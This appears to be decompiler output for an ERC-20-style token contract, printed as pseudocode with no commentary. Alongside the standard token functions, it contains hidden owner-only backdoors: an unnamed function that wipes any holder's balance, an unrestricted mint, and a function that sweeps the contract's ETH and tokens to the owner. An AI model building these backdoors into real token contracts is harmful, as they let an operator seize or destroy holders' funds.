contract main {




// =====================  Runtime code  =====================


const totalSupply = 1000000000 * 10^18


address owner;
address stor1;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
mapping of uint256 balanceOf;
mapping of uint256 allowance;

function name() payable {
    return name[0 len name.length]
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_fa69de09(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    balanceOf[address(arg1)] = 0
}

function mint(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    balanceOf[address(msg.sender)] += arg1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require balanceOf[address(arg1)] >= arg3
    if arg1 != msg.sender:
        if allowance[address(arg1)][address(msg.sender)] != -1:
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            allowance[address(arg1)][address(msg.sender)] -= arg3
    balanceOf[address(arg1)] -= arg3
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require balanceOf[address(msg.sender)] >= arg2
    if msg.sender != msg.sender:
        if allowance[address(msg.sender)][address(msg.sender)] != -1:
            require allowance[address(msg.sender)][address(msg.sender)] >= arg2
            allowance[address(msg.sender)][address(msg.sender)] -= arg2
    balanceOf[address(msg.sender)] -= arg2
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function sub_6e0d152b(?) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    if arg1 == msg.sender:
        call owner with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    else:
        require ext_code.size(arg1)
        staticcall arg1.0x70a08231 with:
                gas gas_remaining wei
               args this.address
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_code.size(arg1)
        call arg1.0xa9059cbb with:
             gas gas_remaining wei
            args owner, ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
}



}
